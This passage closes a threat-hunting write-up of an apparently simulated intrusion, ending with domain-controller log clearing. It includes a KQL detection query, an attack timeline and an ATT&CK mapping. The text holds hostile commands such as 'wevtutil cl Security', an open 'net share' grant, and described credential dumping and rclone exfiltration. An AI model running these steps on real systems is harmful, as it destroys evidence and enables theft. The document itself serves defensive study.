### 🧹 ANTI-FORENSICS — Log Clearing Tool

The attacker used a built-in Windows utility to clear event logs on the DC.

**Question:** What tool was used?  
**Answer:** `wevtutil`  
**Timestamp:** `2026-01-30 23:50:49.975`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where CommandLine_s contains "wevtutil"
    or CommandLine_s contains "Clear-EventLog"
    or CommandLine_s contains "EventLog"
| project UtcTime_s, Computer, CommandLine_s, ParentCommandLine_s
| sort by UtcTime_s asc
```

---

### 🧹 ANTI-FORENSICS — Logs Cleared

**Question:** What two event logs were cleared?  
**Answer:** `Security` and `System`

> - `wevtutil cl Security` — cleared **twice**
> - `wevtutil cl System`
>
> **Critical note:** Sysmon logs were NOT cleared — which is why this investigation was possible. This confirms the Sysmon deployment was critical to the investigation.

---

## 🗺️ Attack Timeline Summary

| Time (UTC) | Phase | Event |
|-----------|-------|-------|
| 21:24:04 | Delivery | `7zG.exe` extracts `EmberForge_Review.zip` to `lmartin` Downloads folder |
| 21:27:03 | Initial Access | `explorer.exe > rundll32.exe > D:\review.dll` — `lmartin` patient zero |
| 21:32:42 | Defense Evasion | First injection: `rundll32.exe > notepad.exe` |
| 21:34:19 | Discovery | `ipconfig /all`, `net user /domain`, `net group "Domain Admins"`, `nltest /dclist` |
| 21:36:34 | Execution | `C:\Users\Public\update.exe` dropped |
| 21:37:16 | Persistence | `WindowsUpdate` scheduled task created (SYSTEM, on reboot) |
| 21:38:33 | Priv Esc | Registry modified for UAC bypass (`ms-settings` hijack) |
| 21:39:02 | Priv Esc | `fodhelper.exe` auto-elevates → `update.exe` runs as Administrator |
| 21:40:26 | C2 | `update.exe` beacons to `cdn.cloud-endpoint.net` (`104.21.30.237`) |
| 21:48:13 | Cred Access | `update.exe` dumps `lsass.dmp` via direct syscalls |
| 21:56:44 | Defense Evasion | Second injection: `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
| 22:07:45 | Lateral Movement | Impacket smbexec service `MzLblBFm` created on `EC2AMAZ-16V3AU4` |
| 22:08:18 | Lateral Movement | First command on server: `whoami` |
| 22:10:52 | Lateral Movement | `AnyDesk.exe` downloaded from `sync.cloud-endpoint.net` |
| 22:14:55 | Lateral Movement | `update.exe` copied to server via `\\10.1.57.66\C$` |
| 22:17:02 | Lateral Movement | `certutil.exe` downloads tools on server from staging server |
| 22:51:36 | Lateral Movement | `net share tools=C:\Users\Public /grant:everyone,full` |
| 22:54:09 | Lateral Movement | Firewall rule `SMB` added — port 445 opened |
| 22:57:27 | Cred Exposure | `net use` command exposes `EmberForge2024!` in plaintext |
| 23:07:45 | Exfiltration | `rclone.exe` executed — begins upload attempts to MEGA |
| 23:11:28 | Collection | `Compress-Archive` stages `C:\GameDev` → `gamedev.zip` |
| 23:11:44 | Exfiltration | Data uploaded to MEGA (`66.203.125.15:443`) |
| 23:12:36 | Attribution | `jwilson.vhr@proton.me` exposed in `rclone.conf` |
| 23:35:15 | DC Compromise | `vssadmin` + `ntds.dit` extracted on DC |
| 23:38:11 | Impact | Backdoor account `svc_backup` created, added to Domain Admins |
| 23:50:49 | Anti-Forensics | `wevtutil` clears Security and System logs on DC |

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment (DLL in archive) |
| Execution | T1218.011 | System Binary Proxy Execution: Rundll32 |
| Defense Evasion | T1055.001 | Process Injection: Dynamic-link Library Injection |
| Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC (`fodhelper`) |
| Defense Evasion | T1112 | Modify Registry (`ms-settings` hijack) |
| Persistence | T1053.005 | Scheduled Task/Job: `WindowsUpdate` |
| Persistence | T1219 | Remote Access Software: AnyDesk |
| C2 | T1071.001 | Application Layer Protocol: Web Protocols |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory |
| Credential Access | T1003.003 | OS Credential Dumping: NTDS |
| Discovery | T1018 | Remote System Discovery |
| Discovery | T1069.002 | Permission Groups Discovery: Domain Groups |
| Discovery | T1482 | Domain Trust Discovery (`nltest`) |
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares |
| Lateral Movement | T1569.002 | System Services: Service Execution (smbexec) |
| Collection | T1560.001 | Archive Collected Data: Compress-Archive |
| Exfiltration | T1567.002 | Exfiltration Over Web Service: MEGA via rclone |
| Impact | T1136.002 | Create Account: Domain Account (`svc_backup`) |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs |

